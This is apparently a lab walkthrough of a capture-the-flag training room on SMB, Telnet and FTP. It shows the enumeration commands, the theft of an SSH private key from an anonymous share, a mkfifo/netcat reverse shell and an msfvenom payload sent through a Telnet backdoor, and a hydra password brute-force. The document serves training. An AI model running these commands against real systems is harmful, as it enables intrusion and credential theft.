# Network Services

## :dancer: SMB

### What does SMB stand for?

{% hint style="success" %}
Server Message Block
{% endhint %}

### What type of protocol is SMB?

{% hint style="success" %}
response-request
{% endhint %}

### **What do clients connect to servers using?**   &#x20;

{% hint style="success" %}
**TCP/IP**
{% endhint %}

### **What systems does Samba run on?**

{% hint style="success" %}
**Unix**
{% endhint %}

### **Conduct an nmap scan of your choosing, How many ports are open?**

```
sudo nmap 10.10.223.88
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-22-21.png>)

### **What ports is SMB running on?**

{% hint style="success" %}
**139/445**
{% endhint %}

### What is the workgroup name?

```
enum4linux -A 10.10.223.88
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-24-31.png>)

### What comes up as the **name** of the machine?

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-27-12.png>)

### What operating system version is running?

{% hint style="success" %}
6.1
{% endhint %}

### What share sticks out as something we might want to investigate?

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-27-51.png>)

### What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

{% hint style="success" %}
smbclient //10.10.10.2/secret -U suit -p 445
{% endhint %}

### Does the share allow anonymous access?

```
smbclient //10.10.223.88/profiles -U Anonymous -N
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-33-34.png>)

### **Who can we assume this profile folder belongs to?**

```
smb: \> get "Working From Home Information.txt"
cat Working\ From\ Home\ Information.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-37-35.png>)

### **What service has been configured to allow him to work from home?**

{% hint style="success" %}
ssh
{% endhint %}

### **Okay! Now we know this, what directory on the share should we look in?**

{% hint style="success" %}
.ssh
{% endhint %}

### This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

```
smb: \> cd .ssh
smb: \.ssh\> ls
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-44-12.png>)

### What is the smb.txt flag?

```
smb: \.ssh\> get id_rsa
chmod 600 id_rsa
ssh -i id_rsa cactus@10.10.223.88
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-47-32.png>)

## :satellite: Telnet

### **What is Telnet?**

{% hint style="success" %}
application protocol
{% endhint %}

### What has slowly replaced Telnet?

{% hint style="success" %}
ssh
{% endhint %}

### **How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?**

{% hint style="success" %}
telnet 10.10.10.3 23
{% endhint %}

### **The lack of what, means that all Telnet communication is in plaintext?**

{% hint style="success" %}
encryption
{% endhint %}

### How many ports are open on the target machine?

```bash
nmap -Pn -p- -v 10.10.206.191
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 22-43-54.png>)

### What **port** is this?

{% hint style="success" %}
8012
{% endhint %}

### This port is unassigned, but still lists the **protocol** it's using, what protocol is this?

{% hint style="success" %}
tcp
{% endhint %}

### Now re-run the **nmap** scan, without the **-p-** tag, how many ports show up as open?

```
nmap 10.10.133.186
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 23-26-42.png>)

### Based on the title returned to us, what do we think this port could be used for?

```
nmap -sV -p8012 10.10.206.191
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 22-50-07.png>)

{% hint style="success" %}
a backdoor
{% endhint %}

### Who could it belong to? Gathering possible **usernames** is an important step in enumeration.

{% hint style="success" %}
skidy
{% endhint %}

### Great! It's an open telnet connection! What welcome message do we receive?

```
telnet 10.10.30.151 8012
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 23-00-53.png>)

### Let's try executing some commands, do we get a return on any input we enter into the telnet session?

{% hint style="success" %}
N
{% endhint %}

### Now, use the command "ping \[local tun0 ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings?

```
sudo tcpdump -i tun0 icmp
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 23-09-48.png>)

```
.RUN ping 10.9.101.193 -c 1
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 23-09-51.png>)

### What word does the generated payload start with?

```
msfvenom -p cmd/unix/reverse_netcat LHOST=10.9.101.193
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 23-13-18.png>)

### What would the command look like for the listening port we selected in our payload?

{% hint style="success" %}
nc -lvp 4444
{% endhint %}

### **Success! What is the contents of flag.txt?**

```
nc -nvlp 4444
cat flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 23-14-51.png>)

```
.RUN mkfifo /tmp/gtjkwze; nc 10.9.101.193 4444 0</tmp/gtjkwze | /bin/sh >/tmp/gtjkwze 2>&1; rm /tmp/gtjkwze
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 23-14-54.png>)

## :open\_file\_folder: FTP

### **What communications model does FTP use?**

{% hint style="success" %}
client-server
{% endhint %}

### What's the standard FTP port?

{% hint style="success" %}
21
{% endhint %}

### How many modes of FTP connection are there?

{% hint style="success" %}
2
{% endhint %}

### How many ports are open on the target machine?

```
nmap -Pn 10.10.66.149
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 08-42-44.png>)

### What port is ftp running on?

{% hint style="success" %}
21
{% endhint %}

### What variant of FTP is running on it?

```
nmap -Pn -sV -p21 10.10.66.149
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 09-10-05.png>)

### What is the name of the file in the anonymous FTP directory?

```
lftp -u anonymous 10.10.66.149
lftp anonymous@10.10.66.149:/> ls
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 08-48-04.png>)

### What do we think a possible username could be?

```
lftp anonymous@10.10.66.149:/> cat PUBLIC_NOTICE.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 08-50-41.png>)

### What is the password for the user "mike"?

```
hydra -l mike -P /usr/share/wordlists/rockyou.txt -f -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 08-56-51.png>)

### What is ftp.txt?

```
lftp -u mike,password 10.10.66.149
lftp mike@10.10.66.149:~> cat ftp.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 09-00-50.png>)

## :link: Support Material

{% embed url="https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef" %}

{% embed url="https://attack.mitre.org/techniques/T1210/" %}

{% embed url="https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/" %}
